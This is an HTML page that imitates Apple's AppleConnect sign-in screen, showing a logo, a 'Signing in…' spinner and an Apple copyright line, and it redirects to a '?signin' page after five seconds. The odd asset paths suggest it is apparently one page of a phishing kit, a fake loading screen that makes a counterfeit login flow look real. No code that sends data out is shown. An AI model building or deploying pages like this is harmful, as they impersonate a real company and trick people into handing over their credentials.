

<meta http-equiv="refresh" content="5;url=?signin">



<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>AppleConnect   Sign In</title>
    <link rel="stylesheet" type="text/css" href="gloglo/prsd.css">
  
        
    

</head>
<body>


<div id="wrapper" style="display: inline;">
    <div id="main" role="main" class="acp-content">
        <div id="plugin"></div>
        <section class="acp-sign-in">
            <div class="acp-login-container">
                <img class="acp-h1" srcset="gloglo/acopic/logo_AppleConnect.png 632w, gloglo/acopic/logo_AppleConnect@2x.png 1264w, gloglo/acopic/logo_AppleConnect@3x.png 1896w" src="gloglo/acopic/logo_AppleConnect.png" sizes="(min-width:1024px) 1896w,(min-width:680px) 1264w,(min-width:320px) 632w">
                <div id="singlesignon" style="display: block;">
                    <div class="acplugin-inline">
                        <span class="signing"><div class="acplugin-spinner"><img id="spinner" style="height: 20px; display: inline;" src="gloglo/acopic/spinner.gif"></div>
                        <p>Signing in…</p></span>
                    </div>
                </div>
               
            </div>
        </section>
        <div>
            
        </div>
    </div>
    <div>
        <footer class="acp-footer">
            
            <p>Copyright © 2022 Apple Inc. All rights reserved. Unauthorized use is prohibited.</p>
        </footer>
    </div>
</div>
<input type="hidden" id="cancelMessage" value="Cancelled">


</body></html>